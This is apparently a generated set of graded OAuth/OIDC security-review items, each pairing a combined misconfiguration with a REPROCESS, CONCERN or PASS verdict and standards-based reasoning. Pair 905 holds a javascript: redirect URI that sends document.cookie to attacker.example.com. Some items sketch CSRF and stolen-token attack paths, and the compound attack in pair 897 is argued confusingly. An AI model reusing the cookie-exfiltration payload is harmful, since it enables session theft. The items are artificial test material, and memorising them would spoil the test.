# CB4 Stage 3 — Action 3 Cross-Source Combination Set
# Node: Multi-source (Nodes 1–9, cross-source arbitration) — ext27
# Sequences: CB4-3.4-897 through CB4-3.4-906
# Instances: 20 (10 base pairs × 2 phrasings each)
# Stratum: B/C (cross-source combinations from ext34 patterns)
# Running total after this file: 1812 instances (906 base pairs)

---

## Pair[CB4-3.4-897]

### A
OAuth state parameter not validated at callback combined with UserInfo endpoint returning all claims regardless of scope:

A web application does not validate the state parameter at the OAuth callback. The same AS's UserInfo endpoint returns all registered user claims (name, email, phone, address) regardless of the access token's scope. An attacker executes a CSRF attack to bind their authorization session to a victim's application session, then uses the resulting minimal-scope access token to query UserInfo and receive the victim's full PII profile.

### B
REPROCESS. Two independent MUST-level violations enabling a cascading compound attack.

Violation 1 — State not validated: RFC 6749 §10.12 MUST CSRF protection. State sent but not validated at callback — CSRF protection non-functional. CWE-352: attacker's authorization code is CSRF-injected into the victim's callback, binding the victim's application session to the attacker's OAuth session. REPROCESS.

Violation 2 — UserInfo scope violation: OIDC Core §5.3.3 MUST scope-filtered claims. UserInfo returns all claims regardless of scope — a client with scope=openid receives name, email, phone_number, and address. REPROCESS.

Cascading compound attack: (1) Attacker initiates an authorization flow with scope=openid against the legitimate AS, obtaining an authorization code. (2) Attacker CSRF-injects their code into the victim's callback — victim's application session is bound to the attacker's OAuth session. Attacker's access token (scope=openid) is what the victim's application holds. (3) Victim's application calls UserInfo with the attacker's access token (scope=openid). Because UserInfo ignores scope and returns all claims, the UserInfo response includes the attacker's own name, email, phone, address. The victim's application may display or process the attacker's profile data as if it were the victim's. More critically, in reverse: if the victim is lured into completing an attacker-prepared authorization flow, the victim's UserInfo data is exposed to the attacker's application.

Both violations are independently REPROCESS. REPROCESS.

### Reason
Two independent MUST violations: RFC 6749 §10.12 CSRF (state not validated) and OIDC Core §5.3.3 UserInfo scope filtering. Cascading compound: CSRF binds attacker session to victim application; UserInfo scope violation exposes PII beyond authorized scope. REPROCESS.

### Phrasing-B
REPROCESS — state not validated (RFC 6749 §10.12 MUST CWE-352) + UserInfo scope violation (§5.3.3 MUST). Cascading: CSRF binds sessions; scope violation exposes PII.

Violation 1: state not validated → CSRF: attacker code → victim's callback → attacker session bound to victim application. REPROCESS.
Violation 2: UserInfo returns all claims for any scope → PII beyond consent. §5.3.3 MUST violated. REPROCESS.
Cascade: attacker uses CSRF to control what access token the victim's application holds; UserInfo scope violation means that token exposes full PII regardless of granted scopes. REPROCESS on both independently.

---

## Pair[CB4-3.4-898]

### A
Access tokens stored in browser localStorage combined with OIDC acr claim not validated despite acr_values request:

A SPA stores access tokens in localStorage. The same application's OIDC integration sends acr_values=2 in authorization requests but does not validate the acr claim in received ID tokens. Both gaps exist in the same production deployment.

### B
CONCERN. Two SHOULD/guidance-level gaps present. They do not escalate to REPROCESS.

Gap 1 — localStorage: ASVS V9.3.1 guidance. localStorage is JavaScript-accessible — XSS can exfiltrate access tokens. Persistent XSS re-exfiltrates each time a fresh token is issued, defeating TTL mitigation. No MUST violation: ASVS V9.3.1 is SHOULD-level guidance. CONCERN.

Gap 2 — acr not validated: OIDC Core §3.1.3.7.9 SHOULD. acr_values=2 request is non-functional without acr validation — AS can return acr=1 (password-only) and RP proceeds as if MFA was satisfied. No MUST violation: §3.1.3.7.9 is SHOULD-level. CONCERN.

Graduation rule: two CONCERN-level gaps do not escalate to REPROCESS. Neither gap is a MUST violation. The combination is more severe than either gap alone (XSS exfiltrates tokens issued without MFA verification), but the graduation rule requires an identified MUST violation for REPROCESS — count of CONCERNs alone is not sufficient.

Combined risk note: an attacker who exploits XSS to exfiltrate access tokens issued without acr=2 verification has tokens that were granted without the required MFA assurance. Both remediations recommended: move tokens to module-level memory; validate acr claim against requested level. CONCERN.

### Reason
Two SHOULD/guidance-level gaps: ASVS V9.3.1 localStorage and OIDC Core §3.1.3.7.9 acr validation. No MUST violation. Graduation rule: two CONCERNs = CONCERN. CONCERN.

### Phrasing-B
CONCERN — localStorage (ASVS V9.3.1 SHOULD) + acr not validated (§3.1.3.7.9 SHOULD). Two CONCERNs; graduation rule: does not escalate to REPROCESS.

localStorage: XSS exfiltration surface; TTL defeated by persistent re-exfiltration; no MUST. CONCERN.
acr not validated: MFA requirement silently bypassed; §3.1.3.7.9 SHOULD not MUST. CONCERN.
Graduation rule: two CONCERN-level gaps without a MUST violation = CONCERN. Risk combination noted (XSS exfiltrates MFA-bypassed tokens) but does not change normative verdict. CONCERN.

---

## Pair[CB4-3.4-899]

### A
OAuth state parameter not validated combined with access tokens stored in localStorage:

A web application does not validate the state parameter at the OAuth callback. The same SPA stores access tokens in localStorage. A successful CSRF attack against the callback binds an attacker's session to the victim's application, and the resulting tokens are immediately persisted in the victim's localStorage where they are accessible to JavaScript.

### B
REPROCESS. One MUST-level violation overrides the CONCERN-level gap. Graduation rule applies.

Violation — State not validated: RFC 6749 §10.12 MUST CSRF protection non-functional. CWE-352 CSRF against OAuth callback is active — attacker's authorization code injected into victim's callback binds the victim's application session to the attacker's tokens. REPROCESS.

Gap — localStorage: ASVS V9.3.1 SHOULD guidance. XSS-based token exfiltration surface present. No MUST violation. CONCERN.

Graduation rule: REPROCESS (state MUST violation) overrides CONCERN (localStorage SHOULD gap). The verdict is REPROCESS.

Note: the CSRF vulnerability enables a distinct attack path from the localStorage gap. CSRF binds the victim's application to the attacker's session without needing XSS. The localStorage gap would separately allow XSS to exfiltrate tokens. However, the graduation rule determines the verdict based on the highest severity finding (MUST violation) not on the number or severity combination of lower-level findings. REPROCESS.

### Reason
Graduation rule: state not validated = REPROCESS (RFC 6749 §10.12 MUST); localStorage = CONCERN (ASVS V9.3.1 SHOULD). REPROCESS overrides CONCERN. One MUST violation determines verdict.

### Phrasing-B
REPROCESS — state not validated (RFC 6749 §10.12 MUST REPROCESS) + localStorage (ASVS V9.3.1 SHOULD CONCERN). Graduation rule: REPROCESS overrides CONCERN.

State not validated: MUST CSRF protection violated; CWE-352 active. REPROCESS.
localStorage: XSS exfiltration surface; SHOULD guidance; no MUST. CONCERN.
Graduation rule: REPROCESS + CONCERN = REPROCESS. MUST violation alone determines verdict. Separate attack paths (CSRF vs XSS) both require individual remediation; verdict determined by MUST. REPROCESS.

---

## Pair[CB4-3.4-900]

### A
SSDF PO.1 security training absent combined with UserInfo returning all claims without scope filtering in production:

An organization has no formal security training (SSDF PO.1 gap). Their OIDC AS's UserInfo endpoint returns all registered user claims regardless of scope. A developer explains: "I didn't know the scope was supposed to limit what UserInfo returns — I thought scope only affected which access the user grants, not what data we return." The AS is deployed in production with multiple registered client applications.

### B
REPROCESS. PO.1 escalation applies.

PO.1 gap alone: CONCERN. No formal security training covering OIDC scope semantics, UserInfo endpoint behavior, or the relationship between OAuth scopes and user PII disclosure. The OIDC scope-to-claim model (§5.4) is a fundamental concept in OIDC implementation.

Production MUST violation: OIDC Core §5.3.3 MUST scope-filtered claims violated. UserInfo returns full PII profile to any client with a valid token regardless of scope. User privacy consent violated — users who authorized scope=openid (sub only) are having their name, email, phone, and address disclosed to any client application.

PO.1 escalation rule: PO.1 absence alone = CONCERN. PO.1 absence + traceable production MUST violation = REPROCESS. The developer comment provides explicit causal traceability: the developer misunderstood what scope controls, and this misunderstanding directly caused the OIDC Core §5.3.3 MUST violation in production. OIDC scope-to-claim semantics is a topic that security training specifically covering OIDC (PO.1 content requirement) would address.

Remediations: (1) immediate — implement §5.4 scope-to-claim mapping in UserInfo endpoint; return only claims authorized by presented scope; (2) systemic — implement SSDF PO.1 training covering OIDC scope semantics, privacy implications, and the scope-to-claim model. REPROCESS.

### Reason
PO.1 escalation: PO.1 gap (CONCERN) + traceable production MUST violation (OIDC Core §5.3.3 UserInfo scope filtering) = REPROCESS. Developer comment provides causal trace: misunderstanding of scope semantics caused the MUST violation.

### Phrasing-B
REPROCESS — SSDF PO.1 absent + OIDC Core §5.3.3 MUST UserInfo scope filtering violated. PO.1 escalation.

PO.1 alone: CONCERN. No training on OIDC scope semantics or UserInfo privacy controls.
MUST violation: UserInfo returns all claims for any valid token. §5.3.3 MUST: scope=openid → sub only.
Developer comment ("scope only affects access, not data returned") = direct causal trace from training gap to MUST violation. This is a foundational OIDC concept; PO.1 training would address it.

PO.1 escalation: CONCERN → REPROCESS. Remediation: (1) §5.4 scope filtering in UserInfo; (2) OIDC security training per PO.1. REPROCESS.

---

## Pair[CB4-3.4-901]

### A
UserInfo returns all claims regardless of scope combined with JWT sub claim absent from access tokens:

An OIDC AS's UserInfo endpoint returns all registered user claims without scope filtering. The same AS issues JWT access tokens for user-initiated flows without a sub claim. A malicious internal client with scope=openid calls UserInfo and receives full PII, but the access token has no sub — so the UserInfo response cannot be attributed to any specific user.

### B
REPROCESS. Two independent MUST-level violations with compounding accountability failure.

Violation 1 — UserInfo scope violation: OIDC Core §5.3.3 MUST scope-filtered claims. Any client with scope=openid receives name, email, phone, address — claims requiring profile, email, phone, and address scopes. User consent violated. REPROCESS.

Violation 2 — JWT sub absent: RFC 9068 §2.2 MUST sub in user-initiated flow JWT access tokens. Without sub, the access token cannot be attributed to a specific user at the RS or UserInfo endpoint. REPROCESS.

Compound accountability failure: UserInfo is supposed to return the claims of the subject identified by the sub claim in the access token. Without sub in the token, UserInfo cannot implement per-user filtering or user-level audit logging (which user's data was returned?). The combination means: (1) any client gets all PII regardless of scope (§5.3.3 violation); (2) the access token used for the request cannot be traced back to a specific user (sub absent violation). Audit log: "who requested this data?" = unknown (no sub). "What data was authorized to be returned?" = unknown (no scope filtering).

Both violations are independently REPROCESS. REPROCESS.

### Reason
Two independent MUST violations: OIDC Core §5.3.3 (UserInfo scope) and RFC 9068 §2.2 (JWT sub). Combined: all PII returned regardless of scope AND the requesting token has no user identity. Complete audit trail and accountability failure. REPROCESS.

### Phrasing-B
REPROCESS — UserInfo scope violation (§5.3.3 MUST) + JWT sub absent (RFC 9068 §2.2 MUST). Compound accountability failure.

Violation 1: UserInfo returns all claims for any scope. §5.3.3 MUST. Consent violated. REPROCESS.
Violation 2: JWT access token has no sub. RFC 9068 §2.2 MUST. Token not attributable to any user. REPROCESS.
Compound: UserInfo returns all PII → no scope restriction; sub absent → no user attribution → audit trail broken. "Who received what data?" = unknowable. REPROCESS on both independently.

---

## Pair[CB4-3.4-902]

### A
OAuth state parameter not validated combined with OIDC acr claim not validated despite acr_values request:

A web application does not validate state at the callback (CSRF protection non-functional). The same application sends acr_values=2 but does not validate acr in received ID tokens. Both gaps exist simultaneously.

### B
REPROCESS. One MUST-level violation overrides the CONCERN-level gap. Graduation rule applies.

Violation — State not validated: RFC 6749 §10.12 MUST CSRF protection violated. State sent but unvalidated = zero CSRF protection. CWE-352 CSRF against OAuth callback is active. REPROCESS.

Gap — acr not validated: OIDC Core §3.1.3.7.9 SHOULD. MFA requirement non-functional without acr validation. AS can return acr=1; RP does not detect. SHOULD-level gap: CONCERN.

Graduation rule: REPROCESS (state MUST) overrides CONCERN (acr SHOULD). The verdict is REPROCESS.

Combined note: CSRF and acr bypass create a compound risk. An attacker who CSRF-injects their authorization session (which may be an acr=1 session even if the target application requires acr=2) can bind the victim's application to a low-assurance session. Without acr validation, the victim's application cannot detect that the session was obtained with insufficient assurance. However, the graduation rule determines the verdict from the highest-severity finding (MUST violation), not from combined risk analysis. REPROCESS.

### Reason
Graduation rule: state not validated = REPROCESS (RFC 6749 §10.12 MUST); acr not validated = CONCERN (OIDC Core §3.1.3.7.9 SHOULD). REPROCESS overrides CONCERN. Combined risk: CSRF injects low-assurance session; acr bypass allows it undetected. REPROCESS.

### Phrasing-B
REPROCESS — state not validated (RFC 6749 §10.12 MUST REPROCESS) + acr not validated (OIDC §3.1.3.7.9 SHOULD CONCERN). Graduation rule: REPROCESS overrides CONCERN.

State not validated: MUST CSRF protection; CWE-352 active. REPROCESS.
acr not validated: SHOULD level; MFA assurance bypass undetected. CONCERN.
Graduation rule: REPROCESS + CONCERN = REPROCESS. Combined risk: CSRF injects acr=1 session for acr=2-required application; acr absence means downgrade undetected. REPROCESS.

---

## Pair[CB4-3.4-903]

### A
Access tokens stored in browser localStorage combined with JWT jti claim absent:

A SPA stores access tokens in localStorage (XSS exfiltration surface). The same AS issues JWT access tokens without jti claims — precision revocation, concurrent-use anomaly detection, and per-token audit correlation are absent. Both gaps exist in the same system.

### B
CONCERN. Two SHOULD/guidance-level gaps present. They do not escalate to REPROCESS.

Gap 1 — localStorage: ASVS V9.3.1 storage guidance. localStorage creates XSS-based token exfiltration surface. Persistent XSS defeats TTL mitigation. No MUST violation. CONCERN.

Gap 2 — jti absent: RFC 7519 §4.1.7 SHOULD jti. Precision revocation, concurrent-use anomaly detection, and per-token audit correlation absent. 15-minute TTL partially mitigates. No MUST violation: §4.1.7 is SHOULD-level. CONCERN.

Graduation rule: two CONCERN-level gaps do not escalate to REPROCESS. Neither gap is a MUST violation. ASVS V9.3.1 is storage guidance; RFC 7519 §4.1.7 is SHOULD. The combination is more severe than either alone (XSS exfiltrates tokens that cannot be individually tracked or revoked), but the verdict ceiling is CONCERN when no MUST violation is identified.

Combined risk: tokens exfiltrated from localStorage have no jti — the RS cannot detect that a stolen token is being used concurrently by the attacker, and the attacker's copy cannot be individually revoked before the TTL expires. The full 15-minute window is available to the attacker after exfiltration with no per-token revocation path. CONCERN.

### Reason
Two SHOULD/guidance-level gaps: ASVS V9.3.1 localStorage and RFC 7519 §4.1.7 jti. No MUST violation. Graduation rule: two CONCERNs = CONCERN. Combined risk documented but does not change normative verdict. CONCERN.

### Phrasing-B
CONCERN — localStorage (ASVS V9.3.1 SHOULD) + jti absent (RFC 7519 §4.1.7 SHOULD). Two CONCERNs; graduation rule does not escalate.

localStorage: XSS exfiltration surface; persistent XSS defeats TTL; no MUST. CONCERN.
jti absent: no precision revocation; no concurrent-use detection; no per-token audit; SHOULD not MUST. CONCERN.
Combined: exfiltrated tokens cannot be individually revoked or anomaly-detected. Two SHOULD gaps without MUST = CONCERN. Both remediations recommended. CONCERN.

---

## Pair[CB4-3.4-904]

### A
UserInfo returns all claims without scope filtering combined with DPoP ath absent at RS:

An OIDC AS's UserInfo endpoint returns all user claims (name, email, phone, address) regardless of scope. The same RS accepts DPoP proofs without validating the ath (access token hash) claim. An attacker who obtains a DPoP-bound access token with scope=openid can use it with their own DPoP key (ath absent) and query UserInfo to receive the full PII profile (scope filtering absent).

### B
REPROCESS. Two independent MUST-level violations enabling a combined PII exfiltration attack.

Violation 1 — UserInfo scope violation: OIDC Core §5.3.3 MUST scope-filtered claims. Full PII returned for any valid scope. User consent violated. REPROCESS.

Violation 2 — DPoP ath absent: RFC 9449 §4.2 MUST ath in DPoP proofs at RS. Stolen DPoP-bound access token can be paired with any DPoP key pair. Sender-constrained property broken. REPROCESS.

Combined attack path: (1) Attacker intercepts a DPoP-bound access token with scope=openid from a victim's request. (2) Because ath is not validated at the RS, the attacker generates their own DPoP key pair and creates a DPoP proof for the UserInfo endpoint URI. (3) The attacker presents the stolen token with their DPoP proof to UserInfo. (4) Because UserInfo ignores scope, the attacker receives the victim's name, email, phone_number, and address — four categories of PII the victim never authorized the attacker (or the original minimal-scope client) to receive.

Without either violation: DPoP ath would prevent stolen token use (binding to original holder's key); scope filtering would prevent over-disclosure even if the token were somehow usable.

Both violations are independently REPROCESS. REPROCESS.

### Reason
Two independent MUST violations: OIDC Core §5.3.3 (UserInfo scope) and RFC 9449 §4.2 (DPoP ath). Combined: DPoP ath absence enables stolen token reuse; scope absence enables PII over-disclosure to the stolen token holder. REPROCESS.

### Phrasing-B
REPROCESS — UserInfo scope violation (§5.3.3 MUST) + DPoP ath absent (RFC 9449 §4.2 MUST). Combined: stolen DPoP-bound token → UserInfo → full PII without scope or binding constraint.

Violation 1: UserInfo returns all claims for any scope. §5.3.3 MUST. REPROCESS.
Violation 2: DPoP ath absent → stolen AT + attacker DPoP key → valid RS request. REPROCESS.
Combined attack: steal DPoP-bound AT (scope=openid) → pair with attacker DPoP key (ath absent) → query UserInfo → receive full PII (scope absent). Both violations required for this path; both independently REPROCESS. REPROCESS.

---

## Pair[CB4-3.4-905]

### A
OAuth state parameter not validated combined with redirect_uri javascript: scheme accepted at registration:

A web application does not validate state at the OAuth callback. The same AS accepts a registered redirect_uri of "javascript:document.location='https://attacker.example.com/?state='+encodeURIComponent(document.cookie)" for a public client. The combination allows an attacker to use the javascript: XSS to extract the victim's state values from cookies/session, enabling CSRF attacks that bypass state.

### B
REPROCESS. Two independent MUST-level violations with compound attack synergy.

Violation 1 — State not validated: RFC 6749 §10.12 MUST CSRF protection. State sent but not validated — CSRF attack directly exploitable without needing the javascript: URI. REPROCESS.

Violation 2 — javascript: scheme accepted: RFC 6749 §3.1.2 absolute URI for network redirection violated. CWE-79 stored XSS at AS origin. The javascript: URI executes in AS origin and can access AS-origin cookies, session storage, and the state values stored there. REPROCESS.

Compound synergy: The javascript: scheme XSS provides an additional capability beyond the direct CSRF path — it can extract the state value from the victim's browser (if the state is stored in a readable cookie or accessible session state) and leak it to the attacker. This means even if the application were to later add state validation, the javascript: XSS could defeat it by exfiltrating the state value and including the correct state in the CSRF injection. The two vulnerabilities are not merely additive — the XSS provides a bypass capability against the CSRF defense.

Both violations are independently REPROCESS. REPROCESS.

### Reason
Two independent MUST violations: RFC 6749 §10.12 CSRF (state not validated) and RFC 6749 §3.1.2 / CWE-79 (javascript: scheme). Compound synergy: XSS can exfiltrate state values to defeat CSRF defenses if added later. Both independently and synergistically REPROCESS.

### Phrasing-B
REPROCESS — state not validated (RFC 6749 §10.12 MUST CWE-352) + javascript: redirect URI (RFC 6749 §3.1.2 CWE-79). Two violations with attack synergy.

Violation 1: state not validated → direct CSRF: attacker's code in victim's callback. REPROCESS.
Violation 2: javascript: scheme → AS-origin XSS → can exfiltrate state values from AS-origin storage → bypass any future state validation. REPROCESS.
Compound: CSRF is active without the XSS; XSS adds state exfiltration capability that would defeat added CSRF defenses. Two independent REPROCESS violations with synergistic impact. REPROCESS.

---

## Pair[CB4-3.4-906]

### A
Complete ext34 compliance baseline — state validation, token storage, acr validation, UserInfo scope filtering:

A web application correctly implements all ext34 controls: (1) 256-bit CSPRNG state per authorization request, exact-match validated at callback, single-use, absent-rejected. (2) Access tokens in module-level memory (not localStorage); refresh token in HttpOnly Secure SameSite=Strict cookie. (3) OIDC acr claim validated: acr ≥ acr_values requested level; insufficient assurance rejected + prompt=login re-auth forced. (4) UserInfo endpoint returns only scope-authorized claims per OIDC Core §5.4 mapping. Earlier controls also correct: JWT iss exact match, DPoP full compliance, PKCE CSPRNG verifier, redirect URI scheme allowlist, jti, auth codes, opaque sub, PAR HTTPS.

### B
PASS. All ext34 and referenced earlier security controls correctly implemented. No findings.

Control 1 — State validation: 256-bit CSPRNG, server-side session storage, exact-match at callback, single-use invalidation, absent-rejected. RFC 6749 §10.12 MUST CSRF protection: satisfied. CWE-352: mitigated. PASS.

Control 2 — Token storage: Module-level memory for access tokens (not localStorage/sessionStorage). HttpOnly Secure SameSite=Strict cookie for refresh token. ASVS V9.3.1 guidance: satisfied. Access token XSS exfiltration from persistent storage: not possible. Refresh token JavaScript access: not possible. CSRF against refresh token use: not possible (SameSite=Strict). PASS.

Control 3 — acr validation: acr claim present, acr ≥ acr_values requested level. Insufficient assurance (acr < requested) triggers rejection and prompt=login re-auth. OIDC Core §3.1.3.7.9 SHOULD: satisfied above-SHOULD floor. MFA assurance requirement is functional end-to-end. PASS.

Control 4 — UserInfo scope filtering: Access token scope parsed; OIDC Core §5.4 mapping applied; only authorized claims returned. scope=openid → sub only. scope=openid profile email → sub + profile claims + email/email_verified. User consent enforced at claim delivery. §5.3.3 MUST: satisfied. PASS.

Earlier controls confirmed: iss exact allowlist (PASS), DPoP full §4.2 compliance (PASS), PKCE CSPRNG 64-char verifier (PASS), redirect URI scheme allowlist (PASS), jti blocklist (PASS), 60s auth codes (PASS), opaque sub PPID (PASS), PAR HTTPS (PASS), public client PKCE enforcement (PASS).

No findings across all ext34 and referenced domains. PASS.

### Reason
All ext34 controls correct: state validation (CSRF), token storage (ASVS V9.3.1), acr validation (§3.1.3.7.9), UserInfo scope filtering (§5.3.3). Plus all referenced earlier controls. Comprehensive positive baseline. PASS.

### Phrasing-B
PASS — all ext34 + earlier controls correct. State validation, module-memory tokens, acr validation, UserInfo scope filtering.

Control 1: 256-bit CSPRNG state + exact-match + single-use + absent-rejected. RFC 6749 §10.12. CWE-352 mitigated. PASS.
Control 2: Module-level memory + HttpOnly Secure SameSite=Strict cookie. ASVS V9.3.1. XSS and CSRF mitigated. PASS.
Control 3: acr ≥ requested; insufficient → reject + re-auth. §3.1.3.7.9 above SHOULD floor. PASS.
Control 4: §5.4 scope-to-claim mapping; openid → sub; consent enforced. §5.3.3 MUST. PASS.
Earlier controls: iss exact, DPoP, PKCE CSPRNG, redirect scheme, jti, auth codes, sub PPID, PAR, public-client PKCE — all PASS.
No findings. PASS.
